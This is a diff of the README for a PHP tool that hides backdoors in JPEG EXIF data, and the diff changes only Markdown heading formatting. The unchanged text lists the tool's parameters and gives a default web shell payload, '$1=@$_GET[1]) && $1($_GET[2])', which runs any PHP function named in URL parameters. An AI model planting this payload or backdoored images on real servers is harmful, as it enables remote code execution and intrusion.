@@ -17,10 +17,10 @@ PHP EXIF Backdoors generator using custom shellcode
 * __Website__ : [Cyber Security Research Center from Romania](http://ccsir.org)
 * __Contact__ : contact [at] ccsir [dot] org
  
-##Usage
+## Usage
 > php phpeb.php [params]
 
-##Params
+## Params
 * -i path_to_image.jpg
 * -o path_to_backdoored_image.jpg
 * -s shellcode (optional)
@@ -28,11 +28,11 @@ PHP EXIF Backdoors generator using custom shellcode
 * -v verbose 1 or 0(optional, Default:0)
 * Default: !empty(\$1=@\$_GET[1]) && \$1(\$_GET[2]);
 	
-##Help
+## Help
   - No need. Just download these files and upload in an environment that supports PHP. You can send any feedback
     or questions to contact [at] ccsir [dot] org
 
-##License
+## License
 
 Copyright (C) 2013 Cyber Security Research Center from Romania
 
